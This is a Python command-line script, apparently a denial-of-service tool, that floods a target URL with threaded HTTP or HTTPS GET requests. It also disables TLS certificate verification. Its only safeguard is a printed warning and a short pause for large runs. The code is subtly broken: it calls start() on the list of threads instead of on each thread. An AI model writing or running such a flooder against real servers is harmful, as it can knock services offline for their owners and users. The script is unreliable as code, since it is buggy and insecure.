import requests
import threading
import sys
import time
import urllib3

def http_flood(target_url, num_requests, protocol="http", delay=0):
    """
    Sends a large number of HTTP or HTTPS requests to a target URL with optional delay.

    Args:
        target_url (str): The target URL (e.g., "example.com").
        num_requests (int): The number of requests to send.
        protocol (str):  "http" or "https"
        delay (float):  Optional delay in seconds between sending each request.
    """
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = f"{protocol}://{target_url}"

    # Disable SSL warnings (for demonstration purposes only - NEVER USE IN PRODUCTION)
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def send_request():
        try:
            if protocol == "http":
                response = requests.get(target_url)
            elif protocol == "https":
                response = requests.get(target_url, verify=False)  # Disable SSL verification.  INSECURE!
            else:
                print("Invalid protocol.  Use http or https")
                return
            print(f"Sent request to {target_url}. Status code: {response.status_code}, Thread: {threading.current_thread().name}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending request to {target_url}: {e}, Thread: {threading.current_thread().name}")

    threads = []
    for i in range(num_requests):
        thread = threading.Thread(target=send_request, name=f"Thread-{i+1}")
        threads.append(thread)
        threads.start()
        if delay > 0:
            time.sleep(delay)  # Introduce delay

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python http_flood.py <target_url> <num_requests> [<protocol>] [<delay>]")
        print("  <target_url>:  The target web domain (e.g., example.com)")
        print("  <num_requests>: The number of requests to send.")
        print("  <protocol>:   (Optional) 'http' or 'https'.  Default is http.")
        print("  <delay>:      (Optional) Delay in seconds between requests. Default is 0.")
        print("Example:")
        print("  python http_flood.py example.com 1000 https 0.1")
        exit(1)

    target_url = sys.argv[1]
    try:
        num_requests = int(sys.argv[2])
    except ValueError:
        print("Error: num_requests must be an integer.")
        exit(1)

    protocol = "http"  # Default
    if len(sys.argv) > 3:
        protocol = sys.argv[3].lower()
        if protocol not in ("http", "https"):
            print("Error: Protocol must be 'http' or 'https'")
            exit(1)

    delay = 0.0  # Default
    if len(sys.argv) > 4:
        try:
            delay = float(sys.argv[4])
        except ValueError:
            print("Error: delay must be a floating-point number.")
            exit(1)
    if num_requests > 500:
        print("Warning: Sending a large number of requests can harm the target server.  Use with extreme caution and only with permission.")
        time.sleep(5)  # Give the user a chance to cancel

    print(f"Sending {num_requests} {protocol.upper()} requests to {target_url} with a delay of {delay} seconds...")
    http_flood(target_url, num_requests, protocol, delay)
    print("Done!")

